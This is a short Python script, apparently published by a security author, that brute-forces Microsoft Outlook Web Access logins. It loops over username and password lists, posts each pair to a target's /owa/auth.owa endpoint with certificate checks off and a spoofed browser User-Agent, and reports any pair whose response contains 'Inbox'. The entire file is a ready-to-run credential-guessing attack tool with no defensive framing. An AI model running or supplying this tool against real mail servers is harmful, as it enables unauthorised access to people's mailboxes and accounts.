#!/usr/bin/python3

"""

__author__ = "ChrishSec"
__copyright__ = "Copyright (C) 2024 ChrishSec"
__license__ = "GNU General Public License v3.0"
__version__ = "1.0.0"

Website: https://ChrishSec.com
GitHub: https://github.com/ChrishSec
Twitter: https://twitter.com/ChrishSec

"""

import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

parser = argparse.ArgumentParser(description='OWA Brute Force Attack Tool By ChrishSec.com')
parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., webmail.target.com)')
parser.add_argument('-u', '--user', required=True, help='Single username or file containing usernames')
parser.add_argument('-p', '--password', required=True, help='Single password or file containing passwords')
args = parser.parse_args()

if args.user.endswith('.txt'):
    usernames = read_file(args.user)
else:
    usernames = [args.user]

if args.password.endswith('.txt'):
    passwords = read_file(args.password)
else:
    passwords = [args.password]

target_url = f"https://{args.target}/owa/auth.owa"
success_indicator = "Inbox" 

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

for username in usernames:
    for password in passwords:
        payload = {
            "destination": f"https://{args.target}/owa/",
            "username": username,
            "password": password,
            "flags": "0",
            "forcedownlevel": "0",
            "trusted": "0"
        }

        response = requests.post(target_url, headers=headers, data=payload, verify=False)

        if success_indicator in response.text:
            print(f"Login successful with username: {username} and password: {password}")

print("Attack complete.")
